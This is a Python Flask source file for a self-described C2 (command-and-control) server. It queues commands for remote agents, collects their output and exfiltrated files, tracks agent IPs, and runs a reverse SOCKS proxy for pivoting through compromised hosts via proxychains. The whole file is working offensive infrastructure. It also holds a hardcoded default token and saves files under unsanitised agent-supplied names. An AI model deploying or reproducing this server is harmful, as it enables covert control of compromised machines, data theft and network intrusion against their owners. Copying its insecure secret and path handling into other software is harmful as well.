#!/usr/bin/env python3
from flask import Flask, request, jsonify, abort
import base64
import os
import socket
import threading
from datetime import datetime
from functools import wraps

app = Flask(__name__)

# ===============================
# --- CONFIGURATION & GLOBALS ---
# ===============================

SERVER_TOKEN = os.getenv("SERVER_TOKEN", "Azerty112345678")
SOCKS_BIND = os.getenv("SOCKS_BIND", "127.0.0.1")

COMMANDS = []     # queue of pending/delivered commands
RESULTS = []      # collected results
AGENTS = {}       # active agents by agent_id

RECEIVED_DIR = "received_files"
os.makedirs(RECEIVED_DIR, exist_ok=True)

# ===============================
# --- AUTH & DEBUG LOGGING ---
# ===============================

@app.before_request
def log_request_headers():
    print(f"\n--- [DEBUG] {request.method} {request.path} ---")
    for k, v in request.headers.items():
        print(f"{k}: {v}")
    print("--------------------------------------------")

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            abort(401, description="Missing Bearer token")
        token = auth_header.split(" ")[1]
        if token != SERVER_TOKEN:
            abort(401, description="Invalid token")
        return f(*args, **kwargs)
    return decorated

# ===============================
# --- AGENT MANAGEMENT HELPERS ---
# ===============================

def get_agent_header():
    """Normalize and return agent identifier."""
    return (
        request.headers.get("X-Agent-Id")
        or request.headers.get("X-Agent-ID")
        or request.headers.get("x-agent-id")
    )

def update_agent(agent_id):
    if not agent_id:
        return
    AGENTS[agent_id] = {
        "ip": request.remote_addr,
        "last_seen": datetime.utcnow().isoformat() + "Z"
    }

# ===============================
# --- COMMAND & RESULT ROUTES ---
# ===============================

@app.route("/command", methods=["GET"])
@require_auth
def fetch_command():
    agent_id = get_agent_header()
    update_agent(agent_id)

    for cmd in COMMANDS:
        if cmd["status"] == "pending" and (cmd["target_agent"] in (None, "", agent_id)):
            cmd["status"] = "delivered"
            print(f"[>] Delivering command #{cmd['id']} to {agent_id}: {cmd['cmd']}")
            return jsonify({"id": str(cmd["id"]), "cmd": cmd["cmd"]})

    return jsonify({"message": "no new command"})

@app.route("/submit_result", methods=["POST"])
@require_auth
def submit_result():
    """
    Receive results (text or file) from an agent.
    Saves files into 'received_files/' and logs structured results into RESULTS[].
    """
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400

    data = request.get_json()
    agent_id = request.headers.get("X-Agent-Id", "unknown")
    command_id = str(data.get("id"))
    file_name = data.get("fileName") or data.get("filename")
    result_b64 = data.get("result")

    print(f"[DEBUG] Received result from {agent_id} for command {command_id}")
    print(f"         file_name={file_name}, result_length={len(result_b64 or '')}")

    # Prepare base info
    result_entry = {
        "cmd_id": command_id,
        "agent_id": agent_id,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "fileName": file_name,
    }

    # --- File handling ---
    if file_name and result_b64:
        try:
            os.makedirs("received_files", exist_ok=True)
            file_bytes = base64.b64decode(result_b64)
            file_path = os.path.join("received_files", file_name)
            with open(file_path, "wb") as f:
                f.write(file_bytes)
            print(f"[+] Saved file: {file_path} ({len(file_bytes)} bytes)")
            result_entry["output"] = f"📁 File '{file_name}' saved successfully ({len(file_bytes)} bytes)"
            result_entry["file_saved_path"] = file_path
        except Exception as e:
            err_msg = f"❌ Error saving file '{file_name}': {e}"
            print(err_msg)
            result_entry["output"] = err_msg

    # --- Text-only results ---
    else:
        result_entry["output"] = result_b64 or "[empty result]"

    # Store in unified list
    RESULTS.append(result_entry)

    # Optionally mark command as complete
    for cmd in COMMANDS:
        if str(cmd["id"]) == command_id:
            cmd["status"] = "completed"
            cmd["result"] = result_entry["output"]
            break

    return jsonify({"message": "Result received successfully"}), 200


@app.route("/submit_command", methods=["POST"])
@require_auth
def submit_command():
    data = request.get_json(force=True)
    cmd = data.get("cmd")
    target_agent = data.get("target_agent") or None
    if not cmd:
        return jsonify({"error": "missing cmd"}), 400

    cmd_entry = {
        "id": len(COMMANDS) + 1,
        "cmd": cmd,
        "target_agent": target_agent,
        "status": "pending",
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    COMMANDS.append(cmd_entry)
    print(f"[+] New command #{cmd_entry['id']} for {target_agent or 'ALL'}: {cmd}")
    return jsonify({"id": cmd_entry["id"]})


@app.route("/get_results", methods=["GET"])
@require_auth
def get_results():
    agent_id = request.args.get("agent_id")
    filtered = [r for r in RESULTS if not agent_id or r["agent_id"] == agent_id]
    return jsonify(filtered)


@app.route("/list_agents", methods=["GET"])
@require_auth
def list_agents():
    agents_list = [
        {"agent_id": aid, "ip": meta["ip"], "last_seen": meta["last_seen"]}
        for aid, meta in AGENTS.items()
    ]
    return jsonify(agents_list)

# ===============================
# --- REVERSE PROXY SECTION ---
# ===============================

def bridge_data(src, dst):
    """Bidirectional socket bridge."""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except Exception:
        pass
    finally:
        for s in (src, dst):
            try:
                s.close()
            except Exception:
                pass


def handle_client(client_conn, agent_listener):
    try:
        print("[*] Waiting for agent connection to pair...")
        agent_conn, agent_addr = agent_listener.accept()
        print(f"[+] Paired with agent {agent_addr}")
        threading.Thread(target=bridge_data, args=(client_conn, agent_conn), daemon=True).start()
        threading.Thread(target=bridge_data, args=(agent_conn, client_conn), daemon=True).start()
    except Exception as e:
        print(f"[-] Bridge error: {e}")
        try:
            client_conn.close()
        except Exception:
            pass


def start_reverse_proxy(listen_port=1080, agent_port=5555):
    """Listen for SOCKS and agent traffic and bridge them."""
    print(f"[+] Reverse proxy service started")
    print(f"    • SOCKS listener: {SOCKS_BIND}:{listen_port}")
    print(f"    • Agent connection port: {agent_port}")

    agent_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    agent_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    agent_listener.bind(("0.0.0.0", agent_port))
    agent_listener.listen(5)

    local_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    local_listener.bind((SOCKS_BIND, listen_port))
    local_listener.listen(5)
    print(f"[+] SOCKS listener active at {SOCKS_BIND}:{listen_port}")
    print(f"    Add to /etc/proxychains4.conf: socks5 {SOCKS_BIND} {listen_port}")

    while True:
        client_conn, client_addr = local_listener.accept()
        print(f"[+] New SOCKS client from {client_addr}")
        threading.Thread(target=handle_client, args=(client_conn, agent_listener), daemon=True).start()

# ===============================
# --- ENTRY POINT ---
# ===============================

if __name__ == "__main__":
    cert_file = "cert.pem"
    key_file = "key.pem"

    threading.Thread(target=start_reverse_proxy, args=(1080, 5555), daemon=True).start()

    if os.path.exists(cert_file) and os.path.exists(key_file):
        print("[+] Starting Flask C2 server with HTTPS...")
        app.run(host="0.0.0.0", port=5000, ssl_context=(cert_file, key_file))
    else:
        print("[-] Certificates not found, using HTTP (dev mode).")
        app.run(host="0.0.0.0", port=5000)

                                    
